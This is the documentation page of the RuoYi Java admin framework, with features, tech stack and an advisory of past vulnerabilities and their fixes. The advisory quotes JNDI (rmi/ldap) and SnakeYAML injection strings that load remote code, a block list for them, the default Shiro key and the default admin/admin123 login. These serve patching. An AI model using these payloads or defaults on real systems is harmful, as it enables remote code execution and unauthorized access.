# 快速了解

## 项目简介

RuoYi是一款基于SpringBoot+Bootstrap的极速后台开发框架。

* RuoYi 官网地址：[http://ruoyi.vip](http://ruoyi.vip)
* RuoYi 在线文档：[http://doc.ruoyi.vip](http://doc.ruoyi.vip)
* RuoYi 源码下载：[https://gitee.com/y_project/RuoYi](https://gitee.com/y_project/RuoYi)
* RuoYi 在线提问：[https://gitee.com/y_project/RuoYi/issues](https://gitee.com/y_project/RuoYi/issues)
* RuoYi 博客：[https://www.oschina.net/p/ruoyi](https://www.oschina.net/p/ruoyi)
* QQ 群号： 1389287、1679294、1529866、1772718、1366522、1382251、1145125、86752435、134072510、210336300、339522636、130035985、143151071

RuoYi 是一个 Java EE 企业级快速开发平台，基于经典技术组合（Spring Boot、Apache Shiro、MyBatis、Thymeleaf、Bootstrap），内置模块如：部门管理、角色用户、菜单及按钮授权、数据权限、系统参数、日志管理、通知公告等。在线定时任务配置；支持集群，支持多数据源，支持分布式事务。

## 主要特性

* 完全响应式布局（支持电脑、平板、手机等所有主流设备）
* 强大的一键生成功能（包括控制器、模型、视图、菜单等）
* 支持多数据源，简单配置即可实现切换。
* 支持按钮及数据权限，可自定义部门数据权限。
* 对常用js插件进行二次封装，使js代码变得简洁，更加易维护
* 完善的XSS防范及脚本过滤，彻底杜绝XSS攻击
* Maven多项目依赖，模块及插件分项目，尽量松耦合，方便模块升级、增减模块。
* 国际化支持，服务端及客户端支持
* 完善的日志记录体系简单注解即可实现
* 支持服务监控，数据监控，缓存监控功能。

## 技术选型

**1、系统环境**

- Java EE 8
- Servlet 3.0
- Apache Maven 3

**2、主框架**

- Spring Boot 2.2.x
- Spring Framework 5.2.x
- Apache Shiro 1.7

**3、持久层**

- Apache MyBatis 3.5.x
- Hibernate Validation 6.0.x
- Alibaba Druid 1.2.x

**4、视图层**

- Bootstrap 3.3.7
- Thymeleaf 3.0.x


## 内置功能

* 用户管理：用户是系统操作者，该功能主要完成系统用户配置。
* 部门管理：配置系统组织机构（公司、部门、小组），树结构展现支持数据权限。
* 岗位管理：配置系统用户所属担任职务。
* 菜单管理：配置系统菜单，操作权限，按钮权限标识等。
* 角色管理：角色菜单权限分配、设置角色按机构进行数据范围权限划分。
* 字典管理：对系统中经常使用的一些较为固定的数据进行维护。
* 参数管理：对系统动态配置常用参数。
* 通知公告：系统通知公告信息发布维护。
* 操作日志：系统正常操作日志记录和查询；系统异常信息日志记录和查询。
* 登录日志：系统登录日志记录查询包含登录异常。
* 在线用户：当前系统中活跃用户状态监控。
* 定时任务：在线（添加、修改、删除)任务调度包含执行结果日志。
* 代码生成：前后端代码的生成（java、html、xml、sql)支持CRUD下载 。
* 系统接口：根据业务代码自动生成相关的api接口文档。
* 服务监控：监视当前系统CPU、内存、磁盘、堆栈等相关信息。
* 缓存监控：对系统的缓存查询，查看、清理等操作。
* 在线构建器：拖动表单元素生成相应的HTML代码。
* 连接池监视：监视当期系统数据库连接池状态，可进行分析SQL找出系统性能瓶颈。

## 历史漏洞

* 存在远程执行漏洞 `RuoYi <= v4.6.2`

漏洞详细：

定时任务存在反序列化漏洞利用点，可以通过发送`rmi`、`http`、`ldap`请求，完成命令执行攻击。

如目标字符串具体内容`rmi`：`org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')`

如目标字符串具体内容`ldap`：`javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit')`

如目标字符串具体内容`http(s)`：`org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://127.0.0.1/poc/yaml-payload.jar"]]]]')`

新增/修改定时任务`SysJobController.java`示例代码（屏蔽`rmi`、`ldap`、`http(s)`目标字符串）
```java
else if (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_RMI))
{
	return error("新增任务'" + job.getJobName() + "'失败，目标字符串不允许'rmi://'调用");
}
else if (StringUtils.containsIgnoreCase(job.getInvokeTarget(), Constants.LOOKUP_LDAP))
{
	return error("修改任务'" + job.getJobName() + "'失败，目标字符串不允许'ldap://'调用");
}
else if (StringUtils.containsAnyIgnoreCase(job.getInvokeTarget(), new String[] { Constants.HTTP, Constants.HTTPS }))
{
	return error("新增任务'" + job.getJobName() + "'失败，目标字符串不允许'http(s)//'调用");
}
```

解决方案：升级`RuoYi`版本到 `>=4.6.3`，或者添加示例代码处理，防止注入漏洞。

* 存在SQL注入漏洞 `RuoYi <= v4.6.1`

`Mybatis`配置中使用了`$`所以会存在`sql`注入漏洞。

漏洞详细：

1、`SysDeptMapper.xml`中的`updateParentDeptStatus`节点使用了`${ancestors}`，修改相关逻辑。转成数组方式修改部门状态。
```java
/**
 * 修改该部门的父级部门状态
 * 
 * @param dept 当前部门
 */
private void updateParentDeptStatusNormal(Dept dept)
{
	String ancestors = dept.getAncestors();
	Long[] deptIds = Convert.toLongArray(ancestors);
	deptMapper.updateDeptStatusNormal(deptIds);
}
```

2、数据权限相关使用了`${params.dataScope}`，`DataScopeAspect.java`数据过滤处理时添加`clearDataScope`拼接权限`sql`前先清空`params.dataScope`参数防止注入。
```java
public class DataScopeAspect
{
    ......
	@Before("dataScopePointCut()")
	public void doBefore(JoinPoint point) throws Throwable
	{
		clearDataScope(point);
		handleDataScope(point);
	}

	private void clearDataScope(final JoinPoint joinPoint)
	{
		Object params = joinPoint.getArgs()[0];
		if (StringUtils.isNotNull(params) && params instanceof BaseEntity)
		{
			BaseEntity baseEntity = (BaseEntity) params;
			baseEntity.getParams().put(DATA_SCOPE, "");
		}
	}
	......
}
```
解决方案：升级`RuoYi`版本到 `>=4.6.2`，或者添加示例代码处理，防止注入漏洞。

* 任意文件下载漏洞 `RuoYi <= v4.5.0`

任意文件下载漏洞，正常的利用手段是下载服务器文件，如脚本代码，服务器配置或者是系统配置等等。可以利用`../`来逐层猜测路径。

网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。

检测漏洞：`CommonController.java`，`/common/download/resource`接口是否包含`checkAllowDownload`用于检查文件是否可下载，如果没有此方法则需要修改，防止被下载关键信息。

解决方案：升级`RuoYi`版本到 `>=4.5.1`，或者重新添加文件下载检查，防止任意文件下载。
```java
/**
 * 本地资源通用下载
 */
@GetMapping("/common/download/resource")
public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)
		throws Exception
{
	try
	{
		if (!FileUtils.checkAllowDownload(resource))
		{
			throw new Exception(StringUtils.format("资源文件({})非法，不允许下载。 ", resource));
		}
		// 本地资源路径
		String localPath = Global.getProfile();
		// 数据库资源地址
		String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);
		// 下载名称
		String downloadName = StringUtils.substringAfterLast(downloadPath, "/");
		response.setContentType(MediaType.APPLICATION_OCTET_STREAM_VALUE);
		FileUtils.setAttachmentResponseHeader(response, downloadName);
		FileUtils.writeBytes(downloadPath, response.getOutputStream());
	}
	catch (Exception e)
	{
		log.error("下载文件失败", e);
	}
}

/**
 * 检查文件是否可下载
 * 
 * @param resource 需要下载的文件
 * @return true 正常 false 非法
 */
public static boolean checkAllowDownload(String resource)
{
	// 禁止目录上跳级别
	if (StringUtils.contains(resource, ".."))
	{
		return false;
	}

	// 检查允许下载的文件规则
	if (ArrayUtils.contains(MimeTypeUtils.DEFAULT_ALLOWED_EXTENSION, FileTypeUtils.getFileType(resource)))
	{
		return true;
	}

	// 不在允许下载的文件规则
	return false;
}
```


* Spring Framework反射型文件下载漏洞 `RuoYi < v4.5.0`

VMware Tanzu发布安全公告，在Spring Framework版本5.2.0-5.2.8、5.1.0-5.1.17、5.0.0-5.0.18、4.3.0-4.3.28和较旧的不受支持的版本中，公布了一个存在于Spring Framework中的反射型文件下载（Reflected File Download,RFD）漏洞（CVE-2020-5421）。

CVE-2020-5421漏洞可通过jsessionid路径参数，绕过防御RFD攻击的保护。攻击者通过向用户发送带有批处理脚本扩展名的URL，使用户下载并执行文件，从而危害系统。VMware Tanzu官方已发布修复漏洞的新版本。

解决方案：升级`spring-boot-starter`版本到 `>=2.1.17`。


* Shiro阻止权限绕过漏洞 `RuoYi < v4.4.0`

Shiro < 1.6.0 版本存在一处权限绕过漏洞，由于 `shiro` 在处理 `url` 时与 `spring` 存在差异，处理身份验证请求时出错导致依然存在身份校验绕过漏洞，远程攻击者可以发送特制的 HTTP 请求，绕过身份验证过程并获得对应用程序的未授权访问。

检测漏洞：`pom.xml` `Shiro < 1.6.0` 则版本存在漏洞。

解决方案：升级版本到 `>=1.6.0`。

* 命令执行漏洞 `RuoYi <= v4.3.0`

若依管理系统使用了Apache Shiro，Shiro 提供了记住我（RememberMe）的功能，下次访问时无需再登录即可访问。系统将密钥硬编码在代码里，且在官方文档中并没有强调修改该密钥，导致框架使用者大多数都使用了默认密钥。攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终造成反序列化漏洞，进而在目标机器上执行任意命令。

检测漏洞：`ShiroConfig.java` 是否包含 `fCq+/xW488hMTCD+cmJ3aQ==`，如果是使用的默认密钥则需要修改，防止被执行命令攻击。

解决方案：升级版本到 `>=v.4.3.1`，并且重新生成一个新的秘钥替换`cipherKey`，保证唯一且不要泄漏。

```yml
# Shiro
shiro:
  cookie:
    # 设置密钥，务必保持唯一性（生成方式，直接拷贝到main运行即可）KeyGenerator keygen = KeyGenerator.getInstance("AES"); SecretKey deskey = keygen.generateKey(); System.out.println(Base64.encodeToString(deskey.getEncoded()));
    cipherKey: zSyK5Kp6PZAAjlT+eeNMlg==
```

```java
// 直接拷贝到main运行即可生成一个Base64唯一字符串
KeyGenerator keygen = KeyGenerator.getInstance("AES");
SecretKey deskey = keygen.generateKey();
System.out.println(Base64.encodeToString(deskey.getEncoded()));
```


* SQL注入攻击 `RuoYi <= v3.2.0`

若依管理系统使用了PageHelper，PageHelper提供了排序（Order by）的功能，前端直接传参完成排序。系统没有做字符检查，导致存在被注入的风险，最终造成数据库中存储的隐私信息全部泄漏。

检测漏洞：`BaseController.java` 是否包含 `String orderBy = pageDomain.getOrderBy();`，如果没有字符检查需要修改，防止被执行注入攻击。

解决方案：升级版本到 `>=v.3.2.0`，或者重新添加字符检查`String orderBy = SqlUtil.escapeOrderBySql(pageDomain.getOrderBy());`，防止注入绕过。

```java
package com.ruoyi.common.utils.sql;

import com.ruoyi.common.exception.base.BaseException;
import com.ruoyi.common.utils.StringUtils;

/**
 * sql操作工具类
 * 
 * @author ruoyi
 */
public class SqlUtil
{
    /**
     * 仅支持字母、数字、下划线、空格、逗号、小数点（支持多个字段排序）
     */
    public static String SQL_PATTERN = "[a-zA-Z0-9_\\ \\,\\.]+";

    /**
     * 检查字符，防止注入绕过
     */
    public static String escapeOrderBySql(String value)
    {
        if (StringUtils.isNotEmpty(value) && !isValidOrderBySql(value))
        {
            throw new BaseException("参数不符合规范，不能进行查询");
        }
        return value;
    }

    /**
     * 验证 order by 语法是否符合规范
     */
    public static boolean isValidOrderBySql(String value)
    {
        return value.matches(SQL_PATTERN);
    }
}
```


* Shiro阻止权限绕过漏洞 `RuoYi <= v4.3.0`

Shiro < 1.5.2 版本存在一处权限绕过漏洞，当受影响版本的Shiro框架结合Spring dynamic controllers使用时，未经授权的远程攻击者可以通过精心构造的请求包进行权限绕过，可能造成鉴权系统失效以及后台功能暴露。

检测漏洞：`pom.xml` `Shiro <=1.5.2` 则版本存在漏洞。

解决方案：升级版本到 `>=1.5.3`。

* Fastjson高危漏洞 `RuoYi <= v4.2.0`

Fastjson < 1.2.68 版本存在一处反序列化漏洞，主要为autoType开关绕过的反序列化漏洞利用，恶意攻击者可以通过该漏洞绕过autoType限制实现远程代码执行攻击，从而获取目标系统管理权限，建议尽快更新漏洞修复版本或采用临时缓解措施加固系统。

检测漏洞：`pom.xml` `Fastjson <=1.2.68` 则版本存在漏洞。

解决方案：升级版本到 `>=1.2.70`。

::: warning 注意
若依平台的默认口令 admin/admin123，请大家在线上环境一定要修改超级管理员的密码。  
`SysPasswordService.encryptPassword(String username, String password, String salt)`  
直接到main运行此方法，填充账号密码及盐（保证唯一），生成md5加密字符串。
:::
